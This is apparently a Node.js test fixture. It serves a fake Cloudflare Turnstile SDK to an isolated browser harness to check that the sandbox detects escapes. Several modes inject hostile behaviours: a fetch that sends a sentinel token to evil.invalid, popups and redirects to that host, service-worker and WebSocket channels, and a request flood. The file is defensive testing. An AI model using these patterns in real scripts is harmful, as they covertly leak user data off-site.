import http from 'node:http';
import fs from 'node:fs';
import {waitForStart}from'../e-verify-group1-remaining-assets/supervisor.mjs';
import {loopbackTransport}from'../e-verify-group1-script-identity/execution/wire.mjs';
import {runIsolatedBrowser}from'./browser.mjs';
import {ORIGIN,SDK}from'./gate.mjs';
await waitForStart();
const mode=process.argv[2],output=process.argv[3];let hits=0;
// Deliberately synthetic SDK. These fixtures prove control, never real vendor init.
const sdk=`window.turnstile={render:(s,o)=>{${mode==='popup'?"window.open('https://evil.invalid/');":mode==='invalidmethod'?`fetch('${ORIGIN}/fixture-status',{method:'DELETE'});`:mode==='wronghost'?"fetch('https://evil.invalid/secret?token=PRIVATE_SENTINEL');":mode==='websocket'?"new WebSocket('wss://challenges.cloudflare.com/fixture-socket');":mode==='unobserved'?"for(const k of ['Worker','SharedWorker','RTCPeerConnection','EventSource','WebTransport']){if(window[k]!==undefined)throw Error('FIXTURE_CHANNEL_NOT_CLOSED')}navigator.serviceWorker.register('https://challenges.cloudflare.com/fixture-sw.js').catch(()=>{});":''}
${mode==='budget'?`Promise.all(Array.from({length:45},(_,i)=>fetch('${ORIGIN}/fixture-count-'+i)));`:
`const f=document.createElement('iframe');f.src='${ORIGIN}/fixture-frame';document.querySelector(s).append(f);window.addEventListener('message',e=>{if(e.source===f.contentWindow&&e.origin==='${ORIGIN}'&&e.data==='DONE')o.callback('DISCARDED_FAKE_TOKEN')});`}return'fixture-widget'}}`;
const child=`fetch('${ORIGIN}/fixture-status',{method:'POST',headers:{'content-type':'text/plain'},body:'fixture-only'}).then(r=>{if(r.ok)parent.postMessage('DONE','*')});`;
const server=http.createServer((q,r)=>{hits++;if(mode==='timeout')return;if(mode==='redirect'){r.writeHead(302,{location:'https://evil.invalid/PRIVATE_SENTINEL'});r.end();return}if(q.url==='/turnstile/v0/api.js?render=explicit'){r.setHeader('content-type','application/javascript');r.end(sdk)}
 else if(q.url==='/fixture-frame'){r.setHeader('content-type','text/html');r.end(`<script src="${ORIGIN}/fixture-child.js"></script>`)}
 else if(q.url==='/fixture-child.js'){r.setHeader('content-type','application/javascript');r.end(child)}
 else if(q.url?.startsWith('/fixture-count-')||q.url==='/fixture-status'){r.setHeader('content-type','application/json');r.end('{}')}
 else{r.writeHead(404);r.end()}});
await new Promise(r=>server.listen(0,'127.0.0.1',r));
const fixture=loopbackTransport('http://127.0.0.1:'+server.address().port);
const transport=(q,o)=>{if(mode==='nodebypass'){void fetch('https://evil.invalid/').catch(()=>{});}return fixture({...q,url:'https://qa.example.invalid'+new URL(q.url).pathname+new URL(q.url).search},o)};
let receipt;
try{receipt=await runIsolatedBrowser({transport,observeMs:5000,workMs:mode==='timeout'?1200:15000});}finally{server.closeAllConnections();await new Promise(r=>server.close(r))}
fs.writeFileSync(output,JSON.stringify({mode,fixture:'SYNTHETIC_ONLY',...receipt,fixtureHits:hits},null,2),{flag:'wx'});
await new Promise(r=>process.send({type:'receipt',status:'complete'},r));
process.disconnect();
